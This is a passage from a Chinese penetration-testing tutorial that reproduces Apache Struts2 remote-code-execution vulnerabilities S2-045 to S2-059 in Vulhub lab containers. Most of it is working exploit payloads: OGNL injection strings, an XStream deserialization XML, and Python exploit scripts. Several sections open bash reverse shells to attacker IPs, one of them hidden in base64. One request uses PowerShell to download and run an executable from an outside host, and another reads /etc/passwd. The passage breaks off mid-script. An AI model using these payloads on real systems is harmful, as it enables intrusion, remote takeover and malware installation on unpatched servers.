@@ -1,0 +1,1008 @@
+## 系列文章
+
+> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)
+
+## 简介
+
+ **渗透测试-地基篇**
+
+该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。
+
+ **请注意** ：
+
+> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
+> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。
+
+名言：
+
+你对这行的兴趣，决定你在这行的成就！
+
+## 一、前言
+
+服务框架是指某领域一类服务的可复用设计与不完整的实现，与软件框架不同的是，服务框架同时体现着面向服务，一个服务框架可以分为两个主要部分：服务引擎、引入的外部服务。
+
+Struts2是apache项目下的一个web
+框架，普遍应用于阿里巴巴、京东等互联网、政府、企业门户网站。可想而知框架连接着网络和系统接触着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，框架的安全稳定运行也直接决定着业务系统能否正常使用。如果框架被远程代码执行攻破，这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。
+
+通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！
+
+今天会讲解到学习Struts2-045至Struts2-061的全部远程代码执行攻击总结、实战武器Struts2的总结RCE使用经验等等操作，如果连Struts2都不会安装操作提权等，怎么拿下对方服务器？
+
+## 二、Vulhub复现Struts2
+
+### 13、S2-045远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的`Content-Type`值来触发该漏洞，进而执行系统命令！
+
+（2）影响版本：
+
+    
+    
+    Struts2.3.5 – 2.3.31
+    Struts2.5 – 2.5.10
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-045漏洞  
+![1641219868_61d3071c6363bf0d8398c.png!small?1641219868949](https://image.3001.net/images/20220103/1641219868_61d3071c6363bf0d8398c.png!small?1641219868949)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641219873_61d30721f29b0cf7a8214.png!small?1641219875240](https://image.3001.net/images/20220103/1641219873_61d30721f29b0cf7a8214.png!small?1641219875240)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：  
+![1641219879_61d307271514b7ed3022c.png!small?1641219879540](https://image.3001.net/images/20220103/1641219879_61d307271514b7ed3022c.png!small?1641219879540)
+
+    
+    
+    http://192.168.253.7:8080/
+    
+
+（2）验证漏洞是否存在-POC-1：
+
+    
+    
+    %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*5000)).(#ros.flush())}
+    
+
+![1641219887_61d3072fc2aeb0df77b84.png!small?1641219889062](https://image.3001.net/images/20220103/1641219887_61d3072fc2aeb0df77b84.png!small?1641219889062)  
+成功远程代码执行！
+
+（3）POC-2：
+
+    
+    
+    %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',11*11)}.multipart/form-data
+    
+
+![1641219894_61d30736b7022a3aafafd.png!small?1641219896643](https://image.3001.net/images/20220103/1641219894_61d30736b7022a3aafafd.png!small?1641219896643)  
+成功远程代码执行！
+
+ **内网实战POC：**
+
+    
+    
+    POST /S2-045/fileupload/doUpload.action HTTP/1.1
+    Host: 20.20.20.104:8080
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='powershell -Command (new-object System.Net.WebClient).DownloadFile(\'http://20.20.20.199/ch4nge52.exe\',\'ch4nge52.exe\');start-process ch4nge52.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} boundary=---------------------------255663886332559909593529682920
+    Content-Length: 344
+    Origin: http://20.20.20.104:8080
+    Connection: close
+    Referer: http://20.20.20.104:8080/S2-045/fileupload/upload.action
+    Cookie: JSESSIONID=7B84132FC4F461D411AEBE4DA902C2AA
+    Upgrade-Insecure-Requests: 1
+    
+    -----------------------------255663886332559909593529682920
+    Content-Disposition: form-data; name="upload"; filename=""
+    Content-Type: application/octet-stream
+    
+    
+    -----------------------------255663886332559909593529682920
+    Content-Disposition: form-data; name="caption"
+    
+    aaa
+    -----------------------------255663886332559909593529682920--    
+
+这个方法可以直接创建一句话！
+
+### 14、S2-046远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+攻击者可以通过设置Content-Disposition的filename字段或者设置Content-Length超过2G这两种方式来触发异常并导致filename字段中的OGNL表达式得到执行从而达到远程攻击的目的。该漏洞与之前S2-045漏洞成因及原理一样（CVE漏洞编号是同一个），只是漏洞利用的字段发生了改变！
+
+与S2-045相同，S2-046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。
+
+（2）影响版本：
+
+    
+    
+    Struts 2.3.5-Struts 2.3.31，Struts 2.5-Struts 2.5.10
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-046漏洞  
+![1641219910_61d30746ed3893e41c831.png!small?1641219911491](https://image.3001.net/images/20220103/1641219910_61d30746ed3893e41c831.png!small?1641219911491)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641219914_61d3074ad7478f5ece5f2.png!small?1641219916303](https://image.3001.net/images/20220103/1641219914_61d3074ad7478f5ece5f2.png!small?1641219916303)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：  
+![1641219919_61d3074f5a09f19bd0615.png!small?1641219919679](https://image.3001.net/images/20220103/1641219919_61d3074f5a09f19bd0615.png!small?1641219919679)
+
+    
+    
+    http://192.168.253.7:8080/
+    
+
+（2）验证漏洞是否存在
+
+抓包后在filename=""填入：
+
+    
+    
+    %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',1+99)}\x00b
+    
+
+![1641219926_61d307563d1573d018f83.png!small?1641219928442](https://image.3001.net/images/20220103/1641219926_61d307563d1573d018f83.png!small?1641219928442)
+
+找到b之前的字符，进行00截断：  
+![1641219938_61d3076238223f26d1839.png!small?1641219940673](https://image.3001.net/images/20220103/1641219938_61d3076238223f26d1839.png!small?1641219940673)
+
+可以看到POC中算式执行成功！
+
+（3）执行"ls"代码：
+
+    
+    
+    "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b"
+    
+
+![1641219945_61d30769c62e6018ffe17.png!small?1641219948146](https://image.3001.net/images/20220103/1641219945_61d30769c62e6018ffe17.png!small?1641219948146)
+
+这里b是62，那么62之前的字符改为00阶段即可!
+
+（4）在filename处插入下列EXP可反弹shell。同样需要进行00截断：
+
+    
+    
+    "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.253.65/8888 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b"
+    
+
+![1641219952_61d30770d6d01f2c054f5.png!small?1641219956091](https://image.3001.net/images/20220103/1641219952_61d30770d6d01f2c054f5.png!small?1641219956091)
+
+反弹shell上线！成功远程代码执行！
+
+### 15、S2-048远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+Apache Struts 1插件的Apache Struts
+2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限
+
+（2）影响版本：
+
+    
+    
+    Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-048漏洞  
+![1641219958_61d307767f6018097d207.png!small?1641219961458](https://image.3001.net/images/20220103/1641219958_61d307767f6018097d207.png!small?1641219961458)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641219963_61d3077bb0c0fa4aeeb87.png!small?1641219964330](https://image.3001.net/images/20220103/1641219963_61d3077bb0c0fa4aeeb87.png!small?1641219964330)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：
+
+![1641219968_61d307805b74559a60b04.png!small?1641219969241](https://image.3001.net/images/20220103/1641219968_61d307805b74559a60b04.png!small?1641219969241)
+
+    
+    
+    http://192.168.253.7:8080/integration/editGangster.action
+    
+
+（2）验证漏洞是否存在-POC-1
+
+    
+    
+    %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
+    
+
+![1641219974_61d307868dd78158b10f1.png!small?1641219983752](https://image.3001.net/images/20220103/1641219974_61d307868dd78158b10f1.png!small?1641219983752)
+
+![1641219978_61d3078aaaff56332c7d1.png!small?1641219985315](https://image.3001.net/images/20220103/1641219978_61d3078aaaff56332c7d1.png!small?1641219985315)
+
+![1641219982_61d3078e3696c51bb8c3b.png!small?1641219985316](https://image.3001.net/images/20220103/1641219982_61d3078e3696c51bb8c3b.png!small?1641219985316)
+
+成功远程代码执行！
+
+（3）POC-2：
+
+    
+    
+    name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%29.%28%23q%29%7D
+    
+
+![1641219988_61d307947bc4e9a41295f.png!small?1641219991665](https://image.3001.net/images/20220103/1641219988_61d307947bc4e9a41295f.png!small?1641219991665)
+
+成功远程代码执行！
+
+（4）Payload-反弹shell：
+
+    
+    
+    %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.253.27/8888 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    
+
+![1641219996_61d3079c8952ee966ab06.png!small?1641220002109](https://image.3001.net/images/20220103/1641219996_61d3079c8952ee966ab06.png!small?1641220002109)
+
+成功远程代码执行！
+
+### 16、S2-052远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+Struts2
+REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击！
+
+（2）影响版本：
+
+    
+    
+    Struts 2.1.2 - Struts 2.3.33
+    Struts 2.5 - Struts 2.5.12
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-052漏洞  
+![1641220003_61d307a3d0492ff0079c0.png!small?1641220006308](https://image.3001.net/images/20220103/1641220003_61d307a3d0492ff0079c0.png!small?1641220006308)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641220008_61d307a8804fae7769e35.png!small?1641220009789](https://image.3001.net/images/20220103/1641220008_61d307a8804fae7769e35.png!small?1641220009789)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：  
+![1641220012_61d307ace8264f8e24453.png!small?1641220013476](https://image.3001.net/images/20220103/1641220012_61d307ace8264f8e24453.png!small?1641220013476)
+
+    
+    
+    http://192.168.253.7:8080/orders/3/edit
+    
+
+（2）验证漏洞是否存在  
+抓包：  
+![1641220018_61d307b29a95eabaac04a.png!small?1641220019210](https://image.3001.net/images/20220103/1641220018_61d307b29a95eabaac04a.png!small?1641220019210)
+
+    
+    
+    <map>
+      <entry>
+        <jdk.nashorn.internal.objects.NativeString>
+          <flags>0</flags>
+          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+            <dataHandler>
+              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+                <is class="javax.crypto.CipherInputStream">
+                  <cipher class="javax.crypto.NullCipher">
+                    <initialized>false</initialized>
+                    <opmode>0</opmode>
+                    <serviceIterator class="javax.imageio.spi.FilterIterator">
+                      <iter class="javax.imageio.spi.FilterIterator">
+                        <iter class="java.util.Collections$EmptyIterator"/>
+                        <next class="java.lang.ProcessBuilder">
+                          <command>
+                            <string>touch</string>
+                            <string>/tmp/success</string>
+                          </command>
+                          <redirectErrorStream>false</redirectErrorStream>
+                        </next>
+                      </iter>
+                      <filter class="javax.imageio.ImageIO$ContainsFilter">
+                        <method>
+                          <class>java.lang.ProcessBuilder</class>
+                          <name>start</name>
+                          <parameter-types/>
+                        </method>
+                        <name>foo</name>
+                      </filter>
+                      <next class="string">foo</next>
+                    </serviceIterator>
+                    <lock/>
+                  </cipher>
+                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
+                  <ibuffer></ibuffer>
+                  <done>false</done>
+                  <ostart>0</ostart>
+                  <ofinish>0</ofinish>
+                  <closed>false</closed>
+                </is>
+                <consumed>false</consumed>
+              </dataSource>
+              <transferFlavors/>
+            </dataHandler>
+            <dataLen>0</dataLen>
+          </value>
+        </jdk.nashorn.internal.objects.NativeString>
+        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+      </entry>
+      <entry>
+        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+      </entry>
+    </map>
+    
+
+这里主于包头修改为 Content-Type: application/xml  
+![1641220026_61d307baaede446505aec.png!small?1641220030374](https://image.3001.net/images/20220103/1641220026_61d307baaede446505aec.png!small?1641220030374)
+
+![1641220032_61d307c080cf4eaa461fa.png!small?1641220043250](https://image.3001.net/images/20220103/1641220032_61d307c080cf4eaa461fa.png!small?1641220043250)
+
+成功远程代码执行！
+
+（3）小技巧  
+![1641220037_61d307c5bb56befb79301.png!small?1641220043250](https://image.3001.net/images/20220103/1641220037_61d307c5bb56befb79301.png!small?1641220043250)
+
+    
+    
+    读文件：
+    <command> <string>cp</string> <string>/etc/passwd</string> <string>/tmp/passwd</string> </command>
+     
+    写文件：
+    <command>
+    <string>bash</string>
+    <string>-c</string>
+    <string>echo dayu hello > /tmp/dayu.txt</string>
+    </command>
+    
+
+### 17、S2-053远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
+
+（2）影响版本：
+
+    
+    
+    Struts 2.0.1-2.3.33
+    Struts 2.5-2.5.10
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-053漏洞  
+![1641220046_61d307ce6f5687b0e400b.png!small?1641220049418](https://image.3001.net/images/20220103/1641220046_61d307ce6f5687b0e400b.png!small?1641220049418)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641220051_61d307d311e86eba66337.png!small?1641220051673](https://image.3001.net/images/20220103/1641220051_61d307d311e86eba66337.png!small?1641220051673)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：  
+![1641220055_61d307d7bb74a896c76cb.png!small?1641220056177](https://image.3001.net/images/20220103/1641220055_61d307d7bb74a896c76cb.png!small?1641220056177)
+
+    
+    
+    http://192.168.253.7:8080/hello.action
+    
+
+（2）验证漏洞是否存在POC
+
+    
+    
+    redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A
+    
+
+![1641220061_61d307ddb17b2ba1c7af6.png!small?1641220064777](https://image.3001.net/images/20220103/1641220061_61d307ddb17b2ba1c7af6.png!small?1641220064777)
+
+成功远程代码执行！
+
+（3）POC-2:
+
+    
+    
+    %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.253.27/8889 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+    
+
+![1641220067_61d307e3243e315351e12.png!small?1641220081573](https://image.3001.net/images/20220103/1641220067_61d307e3243e315351e12.png!small?1641220081573)
+
+成功远程代码执行！
+
+### 18、S2-057远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：  
+-alwaysSelectFullNamespace是-操作元素未设置名称空间属性，或使用了通配符
+
+用户将从uri传递名称空间，并将其解析为OGNL表达式，最终导致远程代码执行漏洞。
+
+    
+    
+    • -alwaysSelectFullNamespace为true。
+    • -action元素没有设置namespace属性，或者使用了通配符。
+    • 命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞
+    
+
+（2）影响版本：
+
+    
+    
+    Struts 2.3–2.3.34
+    Struts2.5–2.5.16
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-057漏洞  
+![1641220074_61d307ea1ec0859a11bb0.png!small?1641220081574](https://image.3001.net/images/20220103/1641220074_61d307ea1ec0859a11bb0.png!small?1641220081574)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641220078_61d307eeda1dcd0f3811a.png!small?1641220081573](https://image.3001.net/images/20220103/1641220078_61d307eeda1dcd0f3811a.png!small?1641220081573)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：  
+![1641220084_61d307f4069d60185b154.png!small?1641220085669](https://image.3001.net/images/20220103/1641220084_61d307f4069d60185b154.png!small?1641220085669)
+
+    
+    
+    http://192.168.253.7:8080/index
+    
+
+（2）验证漏洞是否存在
+
+    
+    
+    /%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action
+    
+
+![1641220089_61d307f974882ab1b4544.png!small?1641220091094](https://image.3001.net/images/20220103/1641220089_61d307f974882ab1b4544.png!small?1641220091094)
+
+成功远程代码执行！
+
+（3）POC源码  
+转换url即可！
+
+    
+    
+    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
+    
+    /actionChain1.action
+    
+
+### 19、S2-059远程执行代码漏洞
+
+#### 1）漏洞简介
+
+（1）漏洞原理：
+
+Apache Struts框架,
+会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码!
+
+（2）影响版本：
+
+    
+    
+    Struts 2.0.0 - Struts 2.5.20
+    
+
+#### 2）漏洞启动
+
+（1）开启struts2-059漏洞  
+![1641220096_61d30800e962ea10e9c13.png!small?1641220099801](https://image.3001.net/images/20220103/1641220096_61d30800e962ea10e9c13.png!small?1641220099801)
+
+    
+    
+    sudo docker-compose up -d
+    
+
+（2）验证是否开启  
+![1641220103_61d30807a03ae2d552649.png!small?1641220104213](https://image.3001.net/images/20220103/1641220103_61d30807a03ae2d552649.png!small?1641220104213)
+
+    
+    
+    sudo docker ps
+    
+
+#### 3）漏洞复现
+
+（1）访问靶机：  
+![1641220107_61d3080bd2af3ca4ea2e8.png!small?1641220108195](https://image.3001.net/images/20220103/1641220107_61d3080bd2af3ca4ea2e8.png!small?1641220108195)
+
+    
+    
+    http://192.168.253.7:8080/?id=1
+    
+
+（2）验证漏洞是否存在
+
+    
+    
+    浏览器访问http://192.168.253.7:8080/?id=%25{10*50}，F12，查看，发现10*50被执行!
+    
+
+![1641220113_61d308117b48b35012d56.png!small?1641220114031](https://image.3001.net/images/20220103/1641220113_61d308117b48b35012d56.png!small?1641220114031)
+
+（3）POC-1：  
+![1641220118_61d3081678a5f841868c1.png!small?1641220121406](https://image.3001.net/images/20220103/1641220118_61d3081678a5f841868c1.png!small?1641220121406)
+
+    
+    
+    %25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d
+    
+
+成功远程代码执行！
+
+（4）POC-2：  
+python2环境下执行：
+
+    
+    
+    import requests
+    
+    url = "http://127.0.0.1:8080"
+    data1 = {
+        "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
+    }
+    data2 = {
+        "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
+    }
+    res1 = requests.post(url, data=data1)
+    # print(res1.text)
+    res2 = requests.post(url, data=data2)
+    # print(res2.text)
+    
+
+![1641220125_61d3081daef3642c352d0.png!small?1641220127651](https://image.3001.net/images/20220103/1641220125_61d3081daef3642c352d0.png!small?1641220127651)
+
+成功远程代码执行！
+
+（5）POC-3-shell：
+
+ **base64编码网址：**
+
+    
+    
+    http://www.jackson-t.ca/runtime-exec-payloads.html
+    
+    bash -i >& /dev/tcp/192.168.253.27/8889 0>&1
+    
+    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1My4yNy84ODg5IDA+JjE=}|{base64,-d}|{bash,-i}
+    
+
+POC:
+
+    
+    
+    import requests
+    url = "http://192.168.253.7:8080"
+    data1 = {
+        "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
+    }
+    data2 = {
+        "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1My4yNy84ODg5IDA+JjE=}|{base64,-d}|{bash,-i}'))}"
